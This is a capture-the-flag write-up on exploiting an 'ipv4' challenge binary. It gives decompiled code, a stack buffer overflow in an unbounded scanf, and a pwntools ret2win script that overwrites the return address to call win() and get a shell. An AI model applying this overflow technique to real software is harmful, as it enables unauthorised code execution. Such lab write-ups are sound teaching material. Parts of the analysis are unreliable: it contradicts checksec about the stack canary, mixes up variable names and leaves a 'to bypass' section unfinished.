### Challenge info:

We were given 1 file:
```c
ipv4
```
File info:
```c
└─$ file ipv4       
ipv4: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1880e686065a632ed42dd8d93ef6827a44813c91, for GNU/Linux 4.4.0, not stripped
```
```c
└─$ checksec --file=ipv4  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   2326 Symbols         No    0               0               ipv4    
```
* `No PIE`: binary addresses are fixed

Analyzing the decompiled code from Ghidra:

`main()`:
```c
undefined8 main(void)
{
  int true;
  undefined1 dst_ip [48];
  undefined8 def_ip [6];
  undefined1 src_ip [48];
  undefined8 ip;
  
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stderr,(char *)0x0,2,0);
  puts("IPv8 is the future! As someone with an ipv4 address, luckily ipv8 is backwards compatible!")
  ;
  puts("What is your Source ASN Prefix?");
  printf("> ");
  scanf(&%s);
  puts("Sorry, you don\'t get to set that silly! This is for ipv8 only!");
                    /* 0.0.0.0
                        */
  ip = 0x302e302e302e30;      // hex value of "0.0.0.0"
  def_ip[0] = 0x302e302e302e30;
  puts("What is your Source Host Address?");
  printf("> ");
  scanf(&%s,src_ip);    // potential BOF bug
  true = check_valid_address(src_ip);
  if (true != 0) {
    puts("Thats not a valid address!\nHere\'s an ipv8 packet for your reference :3");
    printf(header_format);
    exit(1);
  }
  puts("What is your Destination ASN Prefix?");
  printf("> ");
  scanf(&%s);
  puts("Sorry, you don\'t get to set that silly! This is for ipv8 only!");
  puts("What is your Destination Host Address?");
  printf("> ");
  scanf(&%48s,dst_ip);  // "%48s" - limits to only 48 characters 
  true = check_valid_address(dst_ip);
  if (true != 0) {
    puts("You\'re soo silly, u got your source address right, now tell me where u want to go :3");
    printf(header_format);
    exit(1);
  }
  check_rine(def_ip);
  return 0;
}
```
* We can see there are a total of 4 `scanf()` inputs, two of them are useless
* First, this is clearly a BOF bug
  ```c
  scanf(&%s,src_ip);
  ```
* While, the next one is secured
  ```c
  scanf(&%48s,dst_ip);
  ```
* And looking at the initial variables setup:
  ```c
  undefined1 dst_ip [48];
  undefined8 def_ip [6];
  undefined1 src_ip [48];
  undefined8 ip;
  ```
  We can only utilize the BOF to overwrite `ip` and overflow upward to RIP (since no canary implemented in the code)

`check_valid_address()`:
```c
bool check_valid_address(char *ip)

{
  char *finder;
  int octets;
  
  octets = 0;
  for (finder = ip; *finder != '\0'; finder = finder + 1) {
    if (*finder == '.') {
      octets = octets + 1;
    }
  }
  return octets != 3;    // as long as the string has 3 "dots"
}
```
* The check function only check if the IP string we provided contains enough dots which segments the IP's octets
* So we can easily bypass this by putting 3 "." in the input

`check_rine()`:
```c
void check_rine(char *def_ip)

{
  int check;
  
  check = strcmp(def_ip,"0.0.0.0");
  if (check == 0) {
    puts("Sorry, we want devices using ipv8 only...");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  check = strcmp(def_ip,"100.72.7.67");
  if (check == 0) {
    puts("Welcome in our beloved ipv8 address");
    win();      // our target function
  }
  else {
    puts("Wrong RINE address!! Perhaps you were looking for 100.72.7.67");
  }
  return;
}
```
* The final check function at the end of the program `main()`:
  * if `def_ip` still has its default value of `0.0.0.0` ==> program aborts
  * if `def_ip` has an IP matches with the program hardcoded IP ==> `win()`
  * else, the function returns back to `main()` 

`win()`:
```c
void win(void)

{
  system("/bin/sh");
  return;
}
```
* If `win()` is called, we have shell
___
### Exploit:
My first instiction is we have to modify the value of `def_ip` to the hardcoded value `100.72.7.67`

maybe through BOF, since we did find one bug

However, the BOF starts at `src_ip`, which is above the variable `def_ip` on the stack. So we cannot reach `def_ip` with BOF.

So move on to the next approach:

* we can still do buffer overflow till RIP, performing `ret2win` techniqueL
  ```c
  puts("What is your Source Host Address?");
  printf("> ");
  scanf(&%s,src_ip);
  ```
* one problem is that the program do a `check_rine(def_ip);` function prior to reaching our RIP in `main()`

  and since we didnt change the value of `dst_ip` (still `0.0.0.0`), the program aborts:
  ```c
  check = strcmp(def_ip,"0.0.0.0");
  if (check == 0) {
    puts("Sorry, we want devices using ipv8 only...");
    exit(1);  /////////// aborts
  }
  ```
* to bypass 


___
Script: `script.py`
```python
from pwn import *

context.binary = exe = ELF("./ipv4", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br main
		br *main + 282
		br *main + 481
		br *main + 545
		''')


p = process(exe.path)
GDB()

p.sendlineafter(b"> ", b"A")

ret = p64(0x40101a)
win = p64(0x402f45)
payload = ret + win

# bypass the validate() with 3 dots, plus enough padding till RIP. T
# then we have win() at RIP, followed by ret for stack alignment
p.sendlineafter(b"> ", b"." * 3 + b"A"*(104-3) + payload)

p.sendlineafter(b"> ", b"A")

# bypass again, and padding.
# The program will automatically add null byte at the end 
p.sendlineafter(b"> ", b"." * 3 + b"A"  * (48-3))

p.interactive()
```


___
